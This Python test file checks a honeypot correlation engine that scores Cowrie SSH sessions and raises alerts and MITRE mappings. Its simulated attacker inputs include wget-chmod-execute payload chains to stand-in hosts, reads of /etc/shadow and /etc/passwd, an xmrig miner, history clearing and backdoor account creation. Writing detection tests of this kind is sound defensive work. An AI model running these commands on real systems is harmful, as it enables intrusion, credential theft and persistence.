from app.correlation import evaluate_session


def ev(eventid, **kw):
    return {"eventid": eventid, "timestamp": kw.pop("ts", "2026-01-01T00:00:00Z"), **kw}


def cmds(*commands):
    return [ev("cowrie.command.input", input=c) for c in commands]


def test_empty_session_is_low():
    r = evaluate_session([])
    assert r["threatScore"] == 0 and r["riskLevel"] == "LOW"


def test_port_probe_only():
    r = evaluate_session([ev("cowrie.session.connect")])
    assert r["dimensions"]["access"] == 2 and r["alerts"] == []


def test_brute_force_alert():
    events = [ev("cowrie.session.connect")] + [ev("cowrie.login.failed") for _ in range(5)]
    r = evaluate_session(events)
    assert r["dimensions"]["access"] == 12
    assert [a["title"] for a in r["alerts"]] == ["SSH Brute Force Detected"]
    assert r["mitre"][0]["id"] == "T1110"


def test_compromise_after_failures_is_critical_alert():
    events = [ev("cowrie.login.failed"), ev("cowrie.login.success", username="root")]
    r = evaluate_session(events)
    assert r["dimensions"]["access"] == 23          # 18 + 5 for root
    assert any(a["title"] == "Honeypot Credential Compromise" for a in r["alerts"])


def test_whole_words_only():
    # "id" must not match "cd", and "w" must not match inside "shadow"
    events = [ev("cowrie.login.success", username="x")] + cmds("cd /tmp", "echo shadow")
    assert evaluate_session(events)["summary"]["reconCount"] == 0


def test_download_then_execute_chain():
    events = [ev("cowrie.login.success", username="root")] + cmds("wget http://x/y.sh", "chmod +x y.sh", "./y.sh")
    r = evaluate_session(events)
    assert r["dimensions"]["weaponization"] == 19          # 6 download + 8 execution + 5 chain
    assert any("Download -> Execute" in e["reason"] for e in r["explanations"])
    assert any(a["severity"] == "CRITICAL" for a in r["alerts"])
    assert r["threatScore"] == 70 and r["riskLevel"] == "CRITICAL"   # confirmed download-to-execution chain


def test_execute_before_download_is_not_a_chain():
    events = [ev("cowrie.login.success", username="x")] + cmds("./y.sh", "wget http://x/y.sh")
    assert not any("Download -> Execute" in e["reason"] for e in evaluate_session(events)["explanations"])


def test_repeated_commands_do_not_inflate_score():
    once = evaluate_session([ev("cowrie.login.success", username="x")] + cmds("whoami"))
    many = evaluate_session([ev("cowrie.login.success", username="x")] + cmds(*["whoami"] * 20))
    assert once["dimensions"]["activity"] == many["dimensions"]["activity"]


def test_score_never_exceeds_100():
    events = [ev("cowrie.login.failed")] * 3 + [ev("cowrie.login.success", username="root")] + cmds(
        "whoami", "uname -a", "ps", "cat /etc/shadow", "cat /etc/passwd", "wget http://x/m", "chmod +x m",
        "./m", "xmrig", "history -c", "pkill x", "useradd z", "ssh a@b", "crontab -e")
    r = evaluate_session(events)
    assert r["threatScore"] <= 100
    assert all(0 <= v <= 25 for v in r["dimensions"].values())


def test_reading_passwd_file_is_not_account_creation():
    # The original engine flagged "cat /etc/passwd" as "Backdoor Account Created" (and as cron persistence)
    events = [ev("cowrie.login.success", username="x")] + cmds("cat /etc/passwd")
    r = evaluate_session(events)
    titles = [a["title"] for a in r["alerts"]]
    assert "Credential Harvesting Attempt" in titles and "Backdoor Account Created" not in titles
    assert {m["id"] for m in r["mitre"]}.isdisjoint({"T1136", "T1053"})


def test_real_account_creation_is_still_caught():
    events = [ev("cowrie.login.success", username="x")] + cmds("useradd -m bob", "sudo passwd bob")
    assert any(a["title"] == "Backdoor Account Created" for a in evaluate_session(events)["alerts"])



def test_risk_bands_use_calibrated_thresholds():
    from app.correlation import risk_level
    assert risk_level(0) == "LOW"
    assert risk_level(19) == "LOW"
    assert risk_level(20) == "MEDIUM"
    assert risk_level(39) == "MEDIUM"
    assert risk_level(40) == "HIGH"
    assert risk_level(69) == "HIGH"
    assert risk_level(70) == "CRITICAL"
    assert risk_level(100) == "CRITICAL"


def test_chmod_alone_is_not_payload_execution():
    events = [ev("cowrie.login.success", username="x")] + cmds("chmod +x harmless.sh")
    r = evaluate_session(events)
    assert r["summary"]["executionCount"] == 0
    assert not any(a["title"] == "Malicious Payload Execution" for a in r["alerts"])


def test_confirmed_download_execute_chain_gets_critical_session_score():
    events = [ev("cowrie.login.success", username="root"),
              ev("cowrie.command.input", input="wget http://example.test/payload.sh"),
              ev("cowrie.command.input", input="chmod +x payload.sh"),
              ev("cowrie.command.input", input="./payload.sh")]
    r = evaluate_session(events)
    assert r["threatScore"] >= 70
    assert r["riskLevel"] == "CRITICAL"
